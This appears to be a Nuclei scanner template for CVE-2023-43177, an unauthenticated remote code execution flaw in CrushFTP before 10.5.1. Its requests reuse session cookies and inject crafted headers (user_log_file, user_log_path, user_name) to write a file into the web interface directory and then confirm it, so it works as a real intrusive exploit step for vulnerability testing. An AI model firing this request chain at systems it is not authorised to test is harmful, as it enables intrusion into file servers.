flow: http(1) && http(2) && http(3)
http:
- matchers:
  - dsl:
    - contains_all(to_lower(header), "currentauth", "crushauth")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/WebInterface'
- body: 'post=body

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: CrushAuth={{http_1_crushauth}}; currentAuth={{http_1_currentauth}}
    as2-to: X
    user_log_file: '{{filename}}'
    user_log_path: ./WebInterface/{{dirname}}/
    user_name: crushadmin{{dirname}}
  matchers:
  - regex:
    - crushadmin
    type: regex
  method: POST
  path:
  - '{{BaseURL}}/WebInterface/function/?command=getUsername&c2f={{http_1_currentauth}}'
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "crushadmin{{dirname}}")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/WebInterface/{{dirname}}/{{filename}}'
id: CVE-2023-43177
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43177
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-913
    epss-percentile: 0.42667
    epss-score: 0.00106
  description: 'CrushFTP prior to 10.5.1 is vulnerable to Improperly Controlled Modification
    of Dynamically-Determined Object Attributes.

    '
  metadata:
    max-request: 3
    product: crushftp
    vendor: crushftp
  name: CrushFTP < 10.5.1 - Unauthenticated Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-43177
  - https://convergetp.com/2023/11/16/crushftp-zero-day-cve-2023-43177-discovered/
  - https://blog.projectdiscovery.io/crushftp-rce/
  - https://github.com/the-emmons/CVE-Disclosures/blob/main/Pending/CrushFTP-2023-1.md
  severity: critical
  tags: cve,cve2023,crushftp,unauth,rce,intrusive
variables:
  dirname: '{{randbase(5)}}'
  filename: '{{randbase(5)}}'
